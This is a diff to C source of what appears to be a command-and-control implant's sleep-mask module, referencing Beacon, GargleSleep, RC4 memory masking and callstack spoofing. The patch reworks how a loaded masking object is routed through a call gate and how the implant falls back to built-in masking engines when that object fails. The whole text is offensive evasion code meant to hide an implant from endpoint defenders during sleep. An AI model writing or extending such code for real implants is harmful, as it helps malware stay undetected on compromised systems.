@@ -72,8 +72,11 @@ static BOOL sm410_exec(FUNCTION_CALL * fc)
 	if (g_sm410_state != 1 || fc == NULL)
 		return FALSE;
 	decoded = (char *)malloc(SLEEPMASK_REGION_PATCH);
-	if (decoded == NULL)
+	if (decoded == NULL) {
+		g_sm410_state = 2;
+		spawn_log("sm410: no memory", 0);
 		return FALSE;
+	}
 	dlen = sleepmask_decode(decoded, SLEEPMASK_REGION_PATCH, &contract);
 	if (dlen <= 16 || !contract) {
 		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
@@ -109,10 +112,16 @@ static BOOL sm410_exec(FUNCTION_CALL * fc)
 	return g_sm410_state == 1;
 }
 
-/* the gate's executor: every gated call goes through the object */
-static void sm410_gate(FUNCTION_CALL * fc)
+/* the gate's executor: every gated call goes through the object. When the
+ * object cannot be loaded it is taken out of the gate and the call goes
+ * back to gate_dispatch, which runs it with the built-in executors */
+static BOOL sm410_gate(FUNCTION_CALL * fc)
 {
-	(void)sm410_exec(fc);
+	if (!sm410_exec(fc)) {
+		gate_set_executor(NULL);
+		return FALSE;
+	}
+	return TRUE;
 }
 #endif
 
@@ -146,12 +155,16 @@ void GargleSleep(DWORD time) {
 		fc.numOfArgs   = 1;
 		fc.args[0]     = (unsigned long long)time;
 		fc.bMask       = TRUE;
+		/* the same road as every gated call: the re-entrancy guard (the
+		 * object's own load makes gated calls) and the bMask rules (an
+		 * interactive Beacon sleeps in the clear) */
 		gate_set_executor(sm410_gate);
-		if (sm410_exec(&fc))
+		gate_dispatch(&fc);
+		if (g_sm410_state == 1)
 			return;
-		/* the object failed to load: the built-in engines take over */
+		/* the object failed to load: the executor is gone (sm410_gate), the
+		 * built-in engines take over */
 		spawn_log("sm410: fell back", 0);
-		gate_set_executor(NULL);
 	}
 
 	/* Phase 1: self-contained Gen3 window (RC4 + callstack spoof) first;
